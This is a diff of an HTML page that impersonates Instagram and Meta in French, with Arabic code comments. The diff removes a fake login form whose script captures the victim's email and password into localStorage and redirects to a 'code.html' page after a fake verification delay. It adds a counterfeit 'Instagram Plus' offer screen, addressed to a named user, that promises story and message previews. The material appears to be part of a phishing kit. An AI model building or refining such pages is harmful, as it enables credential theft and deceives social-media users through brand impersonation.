@@ -21,6 +21,8 @@
       padding: 20px 0;
     }
     .lang-select { font-size: 13px; color: #65676b; margin-top: 10px; }
+    
+    /* Login Screen Container */
     .container {
       width: 100%;
       max-width: 350px;
@@ -85,76 +87,190 @@
     .footer { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; padding: 0 20px; }
     .btn-signup { width: 100%; padding: 11px; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 20px; }
     .meta-logo { font-size: 13px; color: #0064e0; font-weight: bold; display: flex; align-items: center; gap: 4px; }
+
+    /* Instagram Plus Interface Styles */
+    .ig-plus-screen {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      text-align: center;
+      box-sizing: border-box;
+      position: relative;
+    }
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      left: 15px;
+      font-size: 24px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #000;
+    }
+    .plus-logo {
+      width: 70px;
+      height: 70px;
+      margin: 10px auto 20px;
+    }
+    .plus-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: #000;
+      margin-bottom: 8px;
+      line-height: 1.2;
+    }
+    .gradient-text {
+      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .plus-subtitle {
+      font-size: 14px;
+      color: #262626;
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+    .plus-price {
+      font-size: 13px;
+      color: #737373;
+      margin-bottom: 20px;
+    }
+    .features-list {
+      border: 1px solid #e0e0e0;
+      border-radius: 16px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .feature-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 16px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .feature-item:last-child {
+      border-bottom: none;
+    }
+    .feature-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 14px;
+      color: #000;
+      font-weight: 500;
+    }
+    .feature-icon {
+      width: 20px;
+      height: 20px;
+      fill: none;
+      stroke: #000;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+    .arrow-icon {
+      color: #a8a8a8;
+      font-size: 16px;
+    }
+    .terms-text {
+      font-size: 12px;
+      color: #737373;
+      margin-bottom: 15px;
+      line-height: 1.4;
+    }
+    .terms-text a {
+      color: #00376b;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .btn-action {
+      width: 100%;
+      padding: 12px;
+      background-color: #0064e0;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+    .cancel-text {
+      font-size: 13px;
+      color: #737373;
+    }
   </style>
 </head>
 <body>
 
-  <div class="lang-select">Français (France) ∨</div>
-
-  <div class="container">
-    <svg class="logo" viewBox="0 0 24 24" fill="none">
-      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#ig-grad)"/>
+  <!-- Instagram Plus Interface -->
+  <div class="ig-plus-screen">
+    <button class="close-btn">&times;</button>
+    
+    <svg class="plus-logo" viewBox="0 0 24 24">
+      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#ig-grad2)"/>
       <defs>
-        <radialGradient id="ig-grad" cx="30%" cy="107%" r="130%" fx="30%" fy="107%">
+        <radialGradient id="ig-grad2" cx="30%" cy="107%" r="130%" fx="30%" fy="107%">
           <stop offset="0%" stop-color="#fdf497"/><stop offset="5%" stop-color="#fdf497"/><stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/><stop offset="90%" stop-color="#285AEB"/>
         </radialGradient>
       </defs>
     </svg>
 
-    <div id="errorMsg" class="error-msg">L'adresse doit se terminer par @gmail.com</div>
+    <h2 class="plus-title">Youssef, essayez <span class="gradient-text">Instagram Plus</span> gratuitement pendant un mois</h2>
+    
+    <p class="plus-subtitle">Commandes avancées. Fonctionnalités exclusives.</p>
+    <p class="plus-price">0,99 $US / mois • Ce prix peut inclure des taxes</p>
 
-    <form id="loginForm">
-      <input type="text" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
-      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
-      <button type="submit" id="submitBtn" class="btn-login">
-        <span id="btnText">Se connecter</span>
-      </button>
-    </form>
+    <div class="features-list">
+      <div class="feature-item">
+        <div class="feature-left">
+          <svg class="feature-icon" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
+          <span>Prévisualisez les stories</span>
+        </div>
+        <span class="arrow-icon">›</span>
+      </div>
 
-    <div id="loadingBox" class="loading-box">
-      <div class="spinner"></div>
-      <div class="loading-text">Vérification des données...</div>
+      <div class="feature-item">
+        <div class="feature-left">
+          <svg class="feature-icon" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
+          <span>Consultez les statistiques de relecture de vos stories</span>
+        </div>
+        <span class="arrow-icon">›</span>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-left">
+          <svg class="feature-icon" viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+          <span>Recherchez dans la liste des personnes ayant regardé votre story</span>
+        </div>
+        <span class="arrow-icon">›</span>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-left">
+          <svg class="feature-icon" viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+          <span>Prévisualisez les messages</span>
+        </div>
+        <span class="arrow-icon">›</span>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-left">
+          <svg class="feature-icon" viewBox="0 0 24 24"><polyline points="4 7 4 4 20 4 20 7"></polyline><line x1="9" y1="20" x2="15" y2="20"></line><line x1="12" y1="4" x2="12" y2="20"></line></svg>
+          <span>Accédez à des polices personnalisées pour votre bio</span>
+        </div>
+        <span class="arrow-icon">›</span>
+      </div>
     </div>
 
-    <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
+    <p class="terms-text">
+      En continuant, vous acceptez les <a href="#">Conditions de service</a>. Cet abonnement est renouvelé automatiquement jusqu'à sa résiliation. <a href="#">En savoir plus</a>
+    </p>
+
+    <button class="btn-action">Essayer pour 0,00 $US</button>
+    <p class="cancel-text">Annulez à tout moment.</p>
   </div>
-
-  <div class="footer">
-    <button class="btn-signup">Créer un nouveau compte</button>
-    <div class="meta-logo">∞ Meta</div>
-  </div>
-
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
-      const errorMsg = document.getElementById('errorMsg');
-      const submitBtn = document.getElementById('submitBtn');
-      const loadingBox = document.getElementById('loadingBox');
-
-      // شرط التحقق من نهايته بـ @gmail.com
-      if (!email.toLowerCase().endsWith('@gmail.com')) {
-        errorMsg.style.display = 'block';
-        return;
-      }
-
-      errorMsg.style.display = 'none';
-      submitBtn.disabled = true;
-      submitBtn.style.opacity = '0.6';
-      loadingBox.style.display = 'flex';
-
-      // حفظ الإيميل والباسورد
-      localStorage.setItem('temp_email', email);
-      localStorage.setItem('temp_password', password);
-
-      // الانتظار 10 ثوانٍ قبل التحويل
-      setTimeout(function() {
-        window.location.href = 'code.html';
-      }, 10000);
-    });
-  </script>
 
 </body>
 </html>
